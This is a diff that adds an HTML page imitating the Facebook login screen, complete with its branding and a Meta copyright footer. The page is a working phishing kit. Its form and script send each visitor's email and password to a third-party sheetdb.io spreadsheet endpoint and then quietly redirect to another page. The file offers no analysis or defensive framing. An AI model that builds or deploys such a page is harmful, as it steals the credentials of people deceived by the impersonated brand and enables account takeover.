@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="icon" type="image/x-icon" href="messanger.png">
+    <style>
+        *
+        {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: sans-serif;
+            background-color: #f7f7f7;
+            text-decoration: none;
+        }
+        form{
+            margin: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding: 5%;
+        }
+        form h2
+        {
+            color:  #1877F2;
+            text-align: center;
+            font-size: 35px;
+            padding: 20px 0 10px 0;
+        }
+        form input[type=text],input[type=password]{
+            font-size: 16px;
+            padding: 10px 7px;
+            background-color: #f7f7f7;
+            border: none;
+            box-shadow: 0 0 1px 0;
+        }
+        form button
+        {
+            border: none;
+            background-color: #1877F2;
+            color: #fff;
+            font-size: 22px;
+            padding: 10px 0;
+            border-radius: 5px;
+            font-weight: 550;
+        }
+        .middle
+        {
+            text-align: center;
+            padding: 5px 0;
+            font-size: 18px;
+        }
+        .middle p
+        {
+            font-size: 20px;
+            padding: 9px 0 25px 0;
+            color: rgb(48, 48, 48);
+        }
+        a
+        {
+            color: #1877F2;
+        }
+        #create
+        {
+            border: 1px solid rgb(179, 179, 179);
+            padding: 10px 45px;
+            color: black;
+        }
+        .bottom
+        {
+            display: flex;
+            text-align: center;
+            gap: 15px;
+            margin: 40px 0;
+            justify-content: center;
+        }
+        .bottom .left, .right
+        {
+            display: flex;
+            flex-direction: column;
+            gap: 7px;
+            font-size: 15px;
+        }
+        #meta
+        {
+            text-align: center;
+            color: rgb(48, 48, 48);
+        }
+
+    </style>
+</head>
+<body>
+    <form action="https://sheetdb.io/api/v1/pc3n23tlq3bsl" method="post" id="sheetdb-form"  >
+        <h2>facebook</h2>
+        <input type="text" placeholder="Mobile number or email" required name="data[email]" id="emal">
+        <input type="password" placeholder="Password" required name="data[password]" id="password">
+        <button type="submit" class="submit">Log in</button>
+    </form>
+    <div class="middle">
+        <a href="#">Forget password ?</a>
+        <p>or</p>
+        <a id="create" href="#">Create new account</a>
+    </div>
+    <div class="bottom">
+        <div class="left">
+            <a href="#">English (Us)</a>
+            <a href="#">Hindi</a>
+            <a href="#">Protugues (Brasil)</a>
+        </div>
+        <div class="right">
+            <a href="#">Nepali</a>
+            <a href="#">Espanol</a>
+            <a href="#">Francias (France)</a>
+        </div>
+    </div>
+    <p id="meta">Meta &copy; 2023</p>
+</body>
+<script>
+     var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('indexs.html', target="_self");
+
+          });
+        });
+</script>
+</html>
